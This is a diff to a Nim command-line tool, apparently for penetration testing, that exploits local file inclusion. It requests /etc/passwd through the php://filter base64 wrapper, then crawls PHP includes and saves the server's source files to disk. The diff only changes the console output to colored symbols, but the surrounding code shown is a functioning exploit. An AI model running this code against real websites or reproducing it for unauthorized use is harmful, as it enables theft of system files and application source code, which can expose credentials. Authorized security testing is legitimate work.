@@ -5,6 +5,7 @@ import std/sequtils
 import std/parseopt
 import strutils
 import strformat
+import termstyle
 
 var p = initOptParser()
 let usage = """Author:   Steve Campbell  - @lpha3ch0
@@ -40,18 +41,18 @@ proc testForLFI(url: string): bool =
   try:
     var plaintext = client.getContent(testUrl & "=" & phpfilter & "/etc/passwd").decode
     if "root:" in plaintext:
-      echo "\n[!] LFI found in url. Successfully accessed /etc/passwd\n"
+      echo green "\u2713 LFI found in url. Successfully accessed /etc/passwd\n"
       echo plaintext
       return true
     else:
       return false
   except:
     var error = getCurrentException() 
-    echo error.msg
+    echo red "\u2717 ", red error.msg
   
 
 proc downloadFiles(url: string, files: string): void =
-  echo "\n[i] Searching php files for includes...\n"
+  echo white "\u2139 Searching php files for includes...\n"
   var client = newHTTPClient()
   let testUrl = split(url, '=')[0]
   let phpfilter = "=php://filter/convert.base64-encode/resource="
@@ -65,7 +66,7 @@ proc downloadFiles(url: string, files: string): void =
       let found = findAll(plaintext, regx)
       for file in found:
         foundfiles.add(file)
-        echo "Discovered a file: ", file
+        echo green "\u2713 Discovered a file: ", green file
     except:
       break
   
@@ -73,14 +74,14 @@ proc downloadFiles(url: string, files: string): void =
 
   for file in allfiles:
     var url: string = testUrl & phpfilter & file
-    echo "Checking file: ", file
+    echo white "\u2139 Checking file: ", white file
     try:
       var plaintext = client.getContent(url).decode
       writeFile(file, plaintext)
-      echo &"    Saving file: {file}"
+      echo green "    \u2713 Saving file: ", green file
     except:
       var error = getCurrentException() 
-      echo error.msg
+      echo red "\u2717 ", red error.msg
       break
 
 
@@ -97,7 +98,7 @@ proc main(): void =
       echo usage
       quit(-1)
   if not testForLFI(url):
-    echo "LFI not found in url"
+    echo red "\u2717 LFI not found in url"
     quit(-1)
   downloadFiles(url, files)
     
